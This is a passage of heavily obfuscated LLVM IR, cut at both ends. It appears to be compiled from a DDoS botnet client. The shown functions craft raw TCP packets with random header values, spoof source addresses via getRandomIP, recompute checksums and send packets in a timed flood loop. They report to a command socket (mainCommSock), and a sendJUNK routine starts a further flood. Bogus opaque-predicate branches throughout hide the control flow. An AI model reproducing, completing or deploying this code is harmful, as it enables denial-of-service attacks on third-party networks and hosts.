  %372 = load i32, i32* @y.68
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %370
  %379 = load i32, i32* @x.67
  %380 = load i32, i32* @y.68
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %387

; <label>:387:                                    ; preds = %originalBBpart278, %originalBBpart253
  %388 = load i32, i32* @x.67
  %389 = load i32, i32* @y.68
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %387
  %396 = load i32, i32* @x.67
  %397 = load i32, i32* @y.68
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %404

; <label>:404:                                    ; preds = %originalBBpart282, %257
  br label %405

; <label>:405:                                    ; preds = %404, %originalBBpart234
  %406 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %406, i8** %23, align 8
  br label %206

; <label>:407:                                    ; preds = %206
  br label %408

; <label>:408:                                    ; preds = %407, %167
  %409 = call i32 @rand_cmwc()
  %410 = trunc i32 %409 to i16
  %411 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 0
  %413 = bitcast %union.anon.0* %412 to %struct.anon.1*
  %414 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %413, i32 0, i32 5
  store i16 %410, i16* %414, align 2
  %415 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 0
  %417 = bitcast %union.anon.0* %416 to %struct.anon.1*
  %418 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %417, i32 0, i32 6
  store i16 0, i16* %418, align 4
  %419 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  %421 = bitcast %union.anon.0* %420 to %struct.anon.1*
  %422 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %421, i32 0, i32 7
  store i16 0, i16* %422, align 2
  %423 = load i32, i32* %9, align 4
  %424 = icmp eq i32 %423, 0
  br i1 %424, label %425, label %427

; <label>:425:                                    ; preds = %408
  %426 = call i32 @rand_cmwc()
  br label %448

; <label>:427:                                    ; preds = %408
  %428 = load i32, i32* @x.67
  %429 = load i32, i32* @y.68
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %427
  %436 = load i32, i32* %9, align 4
  %437 = trunc i32 %436 to i16
  %438 = call zeroext i16 @htons(i16 zeroext %437) #13
  %439 = zext i16 %438 to i32
  %440 = load i32, i32* @x.67
  %441 = load i32, i32* @y.68
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %448

; <label>:448:                                    ; preds = %originalBBpart286, %425
  %449 = phi i32 [ %426, %425 ], [ %439, %originalBBpart286 ]
  %450 = load i32, i32* @x.67
  %451 = load i32, i32* @y.68
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %448
  %458 = trunc i32 %449 to i16
  %459 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 0
  %461 = bitcast %union.anon.0* %460 to %struct.anon.1*
  %462 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %461, i32 0, i32 1
  store i16 %458, i16* %462, align 2
  %463 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %464 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %465 = call zeroext i16 @tcpcsum(%struct.iphdr* %463, %struct.tcphdr* %464)
  %466 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 0
  %468 = bitcast %union.anon.0* %467 to %struct.anon.1*
  %469 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %468, i32 0, i32 6
  store i16 %465, i16* %469, align 4
  %470 = bitcast i8* %125 to i16*
  %471 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %472 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %471, i32 0, i32 2
  %473 = load i16, i16* %472, align 2
  %474 = zext i16 %473 to i32
  %475 = call zeroext i16 @csum(i16* %470, i32 %474)
  %476 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %477 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %476, i32 0, i32 7
  store i16 %475, i16* %477, align 2
  %478 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %479 = load i32, i32* %10, align 4
  %480 = add nsw i32 %478, %479
  store i32 %480, i32* %24, align 4
  store i32 0, i32* %25, align 4
  %481 = load i32, i32* @x.67
  %482 = load i32, i32* @y.68
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBBpart2100, label %originalBB88alteredBB

originalBBpart2100:                               ; preds = %originalBB88
  br label %489

; <label>:489:                                    ; preds = %558, %557, %originalBBpart2100
  br label %490

; <label>:490:                                    ; preds = %489
  %491 = load i32, i32* @x.67
  %492 = load i32, i32* @y.68
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %490
  %499 = load i32, i32* %17, align 4
  %500 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %501 = call i64 @sendto(i32 %499, i8* %125, i64 %123, i32 0, %struct.sockaddr* %500, i32 16)
  %502 = load i32, i32* %19, align 4
  %503 = call i32 @getRandomIP(i32 %502)
  %504 = call i32 @htonl(i32 %503) #13
  %505 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %506 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %505, i32 0, i32 8
  store i32 %504, i32* %506, align 4
  %507 = call i32 @rand_cmwc()
  %508 = trunc i32 %507 to i16
  %509 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i32 0, i32 3
  store i16 %508, i16* %510, align 4
  %511 = call i32 @rand_cmwc()
  %512 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 0
  %514 = bitcast %union.anon.0* %513 to %struct.anon.1*
  %515 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %514, i32 0, i32 2
  store i32 %511, i32* %515, align 4
  %516 = call i32 @rand_cmwc()
  %517 = trunc i32 %516 to i16
  %518 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %519 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %518, i32 0, i32 0
  %520 = bitcast %union.anon.0* %519 to %struct.anon.1*
  %521 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %520, i32 0, i32 0
  store i16 %517, i16* %521, align 4
  %522 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 0
  %524 = bitcast %union.anon.0* %523 to %struct.anon.1*
  %525 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %524, i32 0, i32 6
  store i16 0, i16* %525, align 4
  %526 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %527 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %528 = call zeroext i16 @tcpcsum(%struct.iphdr* %526, %struct.tcphdr* %527)
  %529 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 0
  %531 = bitcast %union.anon.0* %530 to %struct.anon.1*
  %532 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %531, i32 0, i32 6
  store i16 %528, i16* %532, align 4
  %533 = bitcast i8* %125 to i16*
  %534 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %535 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %534, i32 0, i32 2
  %536 = load i16, i16* %535, align 2
  %537 = zext i16 %536 to i32
  %538 = call zeroext i16 @csum(i16* %533, i32 %537)
  %539 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 7
  store i16 %538, i16* %540, align 2
  %541 = load i32, i32* %25, align 4
  %542 = load i32, i32* %15, align 4
  %543 = icmp eq i32 %541, %542
  %544 = load i32, i32* @x.67
  %545 = load i32, i32* @y.68
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %543, label %552, label %558

; <label>:552:                                    ; preds = %originalBBpart2104
  %553 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %554 = load i32, i32* %24, align 4
  %555 = icmp sgt i32 %553, %554
  br i1 %555, label %556, label %557

; <label>:556:                                    ; preds = %552
  br label %561

; <label>:557:                                    ; preds = %552
  store i32 0, i32* %25, align 4
  br label %489

; <label>:558:                                    ; preds = %originalBBpart2104
  %559 = load i32, i32* %25, align 4
  %560 = add i32 %559, 1
  store i32 %560, i32* %25, align 4
  br label %489

; <label>:561:                                    ; preds = %556
  %562 = load i32, i32* @x.67
  %563 = load i32, i32* @y.68
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %561
  %570 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %570)
  %571 = load i32, i32* @x.67
  %572 = load i32, i32* @y.68
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %579

; <label>:579:                                    ; preds = %originalBBpart2108, %originalBBpart28, %67, %originalBBpart2
  %580 = load i32, i32* @x.67
  %581 = load i32, i32* @y.68
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %579
  %588 = load i32, i32* @x.67
  %589 = load i32, i32* @y.68
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  store i32 1, i32* %18, align 4
  %596 = load i32, i32* %17, align 4
  %597 = bitcast i32* %18 to i8*
  %598 = call i32 @setsockopt(i32 %596, i32 0, i32 3, i8* %597, i32 4) #2
  %599 = icmp slt i32 %598, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %600 = load i32, i32* @mainCommSock, align 4
  %601 = call i32 (i32, i8*, ...) @sockprintf(i32 %600, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i32 0, i32 0))
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %209
  %602 = load i8*, i8** %23, align 8
  %603 = call i32 @strcmp(i8* %602, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %604 = icmp ne i32 %603, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %229
  %605 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %606 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %605, i32 0, i32 0
  %607 = bitcast %union.anon.0* %606 to %struct.anon.1*
  %608 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %607, i32 0, i32 4
  %609 = load i16, i16* %608, align 4
  %_ = sub i16 %609, -513
  %gen = mul i16 %_, -513
  %_15 = sub i16 0, %609
  %gen16 = add i16 %_15, -513
  %_17 = sub i16 %609, -513
  %gen18 = mul i16 %_17, -513
  %_19 = sub i16 %609, -513
  %gen20 = mul i16 %_19, -513
  %_21 = sub i16 %609, -513
  %gen22 = mul i16 %_21, -513
  %610 = and i16 %609, -513
  %_23 = shl i16 %610, 512
  %_24 = shl i16 %610, 512
  %_25 = sub i16 %610, 512
  %gen26 = mul i16 %_25, 512
  %_27 = sub i16 %610, 512
  %gen28 = mul i16 %_27, 512
  %_29 = sub i16 0, %610
  %gen30 = add i16 %_29, 512
  %_31 = shl i16 %610, 512
  %_32 = shl i16 %610, 512
  %611 = or i16 %610, 512
  store i16 %611, i16* %608, align 4
  br label %originalBB14

originalBB36alteredBB:                            ; preds = %originalBB36, %269
  %612 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 0
  %614 = bitcast %union.anon.0* %613 to %struct.anon.1*
  %615 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %614, i32 0, i32 4
  %616 = load i16, i16* %615, align 4
  %_37 = sub i16 0, %616
  %gen38 = add i16 %_37, -257
  %_39 = sub i16 %616, -257
  %gen40 = mul i16 %_39, -257
  %_41 = sub i16 0, %616
  %gen42 = add i16 %_41, -257
  %_43 = sub i16 %616, -257
  %gen44 = mul i16 %_43, -257
  %_45 = sub i16 0, %616
  %gen46 = add i16 %_45, -257
  %_47 = shl i16 %616, -257
  %_48 = sub i16 0, %616
  %gen49 = add i16 %_48, -257
  %617 = and i16 %616, -257
  %_50 = sub i16 0, %617
  %gen51 = add i16 %_50, 256
  %618 = or i16 %617, 256
  store i16 %618, i16* %615, align 4
  br label %originalBB36

originalBB55alteredBB:                            ; preds = %originalBB55, %293
  %619 = load i8*, i8** %23, align 8
  %620 = call i32 @strcmp(i8* %619, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %621 = icmp ne i32 %620, 0
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %321
  %622 = load i8*, i8** %23, align 8
  %623 = call i32 @strcmp(i8* %622, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0)) #10
  %624 = icmp ne i32 %623, 0
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %341
  %625 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %626 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %625, i32 0, i32 0
  %627 = bitcast %union.anon.0* %626 to %struct.anon.1*
  %628 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %627, i32 0, i32 4
  %629 = load i16, i16* %628, align 4
  %_64 = sub i16 %629, -2049
  %gen65 = mul i16 %_64, -2049
  %630 = and i16 %629, -2049
  %_66 = sub i16 0, %630
  %gen67 = add i16 %_66, 2048
  %_68 = shl i16 %630, 2048
  %_69 = shl i16 %630, 2048
  %_70 = shl i16 %630, 2048
  %_71 = sub i16 %630, 2048
  %gen72 = mul i16 %_71, 2048
  %631 = or i16 %630, 2048
  store i16 %631, i16* %628, align 4
  br label %originalBB63

originalBB76alteredBB:                            ; preds = %originalBB76, %370
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %387
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %427
  %632 = load i32, i32* %9, align 4
  %633 = trunc i32 %632 to i16
  %634 = call zeroext i16 @htons(i16 zeroext %633) #13
  %635 = zext i16 %634 to i32
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %448
  %636 = trunc i32 %449 to i16
  %637 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %638 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %637, i32 0, i32 0
  %639 = bitcast %union.anon.0* %638 to %struct.anon.1*
  %640 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %639, i32 0, i32 1
  store i16 %636, i16* %640, align 2
  %641 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %642 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %643 = call zeroext i16 @tcpcsum(%struct.iphdr* %641, %struct.tcphdr* %642)
  %644 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %645 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %644, i32 0, i32 0
  %646 = bitcast %union.anon.0* %645 to %struct.anon.1*
  %647 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %646, i32 0, i32 6
  store i16 %643, i16* %647, align 4
  %648 = bitcast i8* %125 to i16*
  %649 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %650 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %649, i32 0, i32 2
  %651 = load i16, i16* %650, align 2
  %652 = zext i16 %651 to i32
  %653 = call zeroext i16 @csum(i16* %648, i32 %652)
  %654 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %655 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %654, i32 0, i32 7
  store i16 %653, i16* %655, align 2
  %656 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %657 = load i32, i32* %10, align 4
  %_89 = sub i32 %656, %657
  %gen90 = mul i32 %_89, %657
  %_91 = shl i32 %656, %657
  %_92 = sub i32 0, %656
  %gen93 = add i32 %_92, %657
  %_94 = shl i32 %656, %657
  %_95 = sub i32 0, %656
  %gen96 = add i32 %_95, %657
  %_97 = sub i32 %656, %657
  %gen98 = mul i32 %_97, %657
  %658 = add nsw i32 %656, %657
  store i32 %658, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %originalBB88

originalBB102alteredBB:                           ; preds = %originalBB102, %490
  %659 = load i32, i32* %17, align 4
  %660 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %661 = call i64 @sendto(i32 %659, i8* %125, i64 %123, i32 0, %struct.sockaddr* %660, i32 16)
  %662 = load i32, i32* %19, align 4
  %663 = call i32 @getRandomIP(i32 %662)
  %664 = call i32 @htonl(i32 %663) #13
  %665 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %666 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %665, i32 0, i32 8
  store i32 %664, i32* %666, align 4
  %667 = call i32 @rand_cmwc()
  %668 = trunc i32 %667 to i16
  %669 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %670 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %669, i32 0, i32 3
  store i16 %668, i16* %670, align 4
  %671 = call i32 @rand_cmwc()
  %672 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %673 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %672, i32 0, i32 0
  %674 = bitcast %union.anon.0* %673 to %struct.anon.1*
  %675 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %674, i32 0, i32 2
  store i32 %671, i32* %675, align 4
  %676 = call i32 @rand_cmwc()
  %677 = trunc i32 %676 to i16
  %678 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %679 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %678, i32 0, i32 0
  %680 = bitcast %union.anon.0* %679 to %struct.anon.1*
  %681 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %680, i32 0, i32 0
  store i16 %677, i16* %681, align 4
  %682 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %683 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %682, i32 0, i32 0
  %684 = bitcast %union.anon.0* %683 to %struct.anon.1*
  %685 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %684, i32 0, i32 6
  store i16 0, i16* %685, align 4
  %686 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %687 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %688 = call zeroext i16 @tcpcsum(%struct.iphdr* %686, %struct.tcphdr* %687)
  %689 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %690 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %689, i32 0, i32 0
  %691 = bitcast %union.anon.0* %690 to %struct.anon.1*
  %692 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %691, i32 0, i32 6
  store i16 %688, i16* %692, align 4
  %693 = bitcast i8* %125 to i16*
  %694 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %695 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %694, i32 0, i32 2
  %696 = load i16, i16* %695, align 2
  %697 = zext i16 %696 to i32
  %698 = call zeroext i16 @csum(i16* %693, i32 %697)
  %699 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %700 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %699, i32 0, i32 7
  store i16 %698, i16* %700, align 2
  %701 = load i32, i32* %25, align 4
  %702 = load i32, i32* %15, align 4
  %703 = icmp eq i32 %701, %702
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %561
  %704 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %704)
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %579
  br label %originalBB110
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.69
  %5 = load i32, i32* @y.70
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.__sigset_t, align 8
  %20 = alloca %struct.timeval, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %28 = call i32 @getdtablesize() #2
  %29 = sdiv i32 %28, 2
  store i32 %29, i32* %15, align 4
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %13, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #13
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %12, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  %39 = load i32, i32* @x.69
  %40 = load i32, i32* @y.70
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %48

; <label>:47:                                     ; preds = %originalBBpart2
  br label %402

; <label>:48:                                     ; preds = %originalBBpart2
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %15, align 4
  %52 = zext i32 %51 to i64
  %53 = call i8* @llvm.stacksave()
  store i8* %53, i8** %18, align 8
  %54 = alloca %struct.state_t, i64 %52, align 16
  %55 = bitcast %struct.state_t* %54 to i8*
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = mul i64 %57, 5
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 %58, i32 16, i1 false)
  %59 = call noalias i8* @malloc(i64 1024) #2
  store i8* %59, i8** %24, align 8
  %60 = load i8*, i8** %24, align 8
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 1024, i32 1, i1 false)
  %61 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %62 = load i32, i32* %14, align 4
  %63 = add nsw i32 %61, %62
  store i32 %63, i32* %25, align 4
  br label %64

; <label>:64:                                     ; preds = %383, %48
  %65 = load i32, i32* @x.69
  %66 = load i32, i32* @y.70
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %64
  %73 = load i32, i32* %25, align 4
  %74 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %75 = icmp sgt i32 %73, %74
  %76 = load i32, i32* @x.69
  %77 = load i32, i32* @y.70
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %75, label %84, label %384

; <label>:84:                                     ; preds = %originalBBpart24
  store i32 0, i32* %16, align 4
  br label %85

; <label>:85:                                     ; preds = %originalBBpart278, %84
  %86 = load i32, i32* %16, align 4
  %87 = load i32, i32* %15, align 4
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %89, label %383

; <label>:89:                                     ; preds = %85
  %90 = load i32, i32* @x.69
  %91 = load i32, i32* @y.70
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %89
  %98 = load i32, i32* %16, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %99
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %100, i32 0, i32 1
  %102 = load i8, i8* %101, align 4
  %103 = zext i8 %102 to i32
  %104 = load i32, i32* @x.69
  %105 = load i32, i32* @y.70
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
